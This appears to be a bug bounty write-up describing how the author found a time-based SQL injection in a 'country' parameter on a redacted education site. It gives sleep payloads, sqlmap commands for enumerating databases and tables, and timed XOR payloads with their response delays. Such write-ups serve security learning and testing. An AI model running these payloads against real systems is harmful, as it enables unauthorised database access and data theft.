So during recon I had already sorted the urls with params which might be vulnerable to SQL Injection(using gf). So I then started opening those one by one to see which ones were actually active and worth trying for, and side by side each time I was replacing the parameter value with the sleep payload ,(select * from (select(sleep(20)))a) , so basically I was trying to find Time Based SQLi because putting all of the urls in sqlmap is very much time consuming.

Finally I came across one url https://edu.target.com//us/search/site.html?country=us&searchtype=mirror-country in which I was getting a delay when I injected my payload in “country” parameter. So I was pretty sure that this would be vulnerable😈, but I had to confirm so I captured my request and sent it to repeater. There I kept on changing the value of seconds from 30 to 40 to 60 and they were getting accurate delay, so now I finally found a url which I would be sending to sqlmap.

Now in kali I wrote the following command:

sqlmap -u ‘https://edu.target.com//us/search/site.html?country=us&searchtype=mirror-country' — random-agent — level=5 — risk=3 — dbs — batch
sqlmap -u ‘https://edu.target.com//us/search/site.html?country=us&searchtype=mirror-country' — random-agent — level=5 — risk=3 -D ‘training’ — tables

Got 91 tables in training database

sqlmap -u ‘https://edu.target.com//us/search/site.html?country=us&searchtype=mirror-country' — random-agent — level=5 — risk=3 -D ‘information_schema’ — tables

sqlmap  -p log -r request-cz.txt --current-user  --level=2 --risk=2
    0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.508

    0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.491
    0"XOR(if(now()=sysdate(),sleep(6),0))XOR”Z => 6.508
    0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.695
